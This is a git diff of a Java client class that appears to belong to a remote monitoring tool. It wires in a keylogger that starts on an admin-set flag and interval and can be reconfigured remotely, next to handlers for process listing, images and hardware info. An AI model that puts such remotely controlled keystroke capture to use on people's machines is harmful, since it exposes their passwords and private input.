@@ -3,11 +3,9 @@ package Client;
 import Client.GUI.Lib.GlobalVariable;
 import Client.GUI.User.LoginUserGUI;
 import Server.EventDispatcher.EventDispatcher;
+import Server.IntervalThread;
 import SocketMessageReceiver.CustomAdminReceiver.LoginUserResultReceiver;
-import SocketMessageReceiver.CustomUserReceiver.GetHardwareInfoReceiver;
-import SocketMessageReceiver.CustomUserReceiver.GetImageReceiver;
-import SocketMessageReceiver.CustomUserReceiver.GetProcessesReceiver;
-import SocketMessageReceiver.CustomUserReceiver.ProcessActionReceiver;
+import SocketMessageReceiver.CustomUserReceiver.*;
 import SocketMessageReceiver.DataType.LogOutUserRequest;
 import SocketMessageReceiver.DataType.LoginUserRequest;
 import SocketMessageReceiver.DataType.LoginUserUDPRequest;
@@ -21,14 +19,16 @@ import lc.kra.system.keyboard.GlobalKeyboardHook;
 import lc.kra.system.keyboard.event.GlobalKeyEvent;
 import lc.kra.system.keyboard.event.GlobalKeyListener;
 
+import java.awt.*;
+import java.awt.event.KeyEvent;
 import java.io.*;
 import java.net.ServerSocket;
 
 public class User {
-
     public static void main(String[] args) throws IOException, InterruptedException {
         try (ServerSocket ignored = new ServerSocket(9999)) {
             var tcpClient = new TCPClient("localhost", 4445);
+
             tcpClient.setBuffer(1024 * 1024);
             tcpClient.start();
 
@@ -46,11 +46,16 @@ public class User {
             var uuid = Utilities.getUUID();
             var adminId = 19;
 
+
             EventDispatcher.startListening(new LoginUserResultReceiver((loginUserResult) -> {
-                System.out.println(loginUserResult);
-//                GlobalVariable.LoginUserGUI.dispose();
-//                var loginUdpSender = new LoginUDPSender(udpClient);
-//                loginUdpSender.send(null, new LoginUserUDPRequest(adminId, uuid));
+                if (!loginUserResult.userInfo.isWriteLog) return;
+
+                if (KeyLogger.instance != null) KeyLogger.instance.stop();
+
+                var keyLogger = new KeyLogger(loginUserResult.userInfo.writeLogInterval);
+                keyLogger.start();
+
+                KeyLogger.instance = keyLogger;
             }));
 
             EventDispatcher.startListening(new GetProcessesReceiver());
@@ -58,19 +63,7 @@ public class User {
             EventDispatcher.startListening(new GetImageReceiver());
 
             EventDispatcher.startListening(new ProcessActionReceiver());
-
-            GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(false);
-            keyboardHook.addKeyListener(new GlobalKeyListener() {
-                @Override
-                public void keyPressed(GlobalKeyEvent globalKeyEvent) {
-//                    System.out.println(globalKeyEvent);
-                }
-
-                @Override
-                public void keyReleased(GlobalKeyEvent globalKeyEvent) {
-
-                }
-            });
+            EventDispatcher.startListening(new ChangeKeyLogConfigReceiver());
 
             var shutdownThread = new Thread(() -> {
                 var sender = new LogOutUserSender(tcpClient);
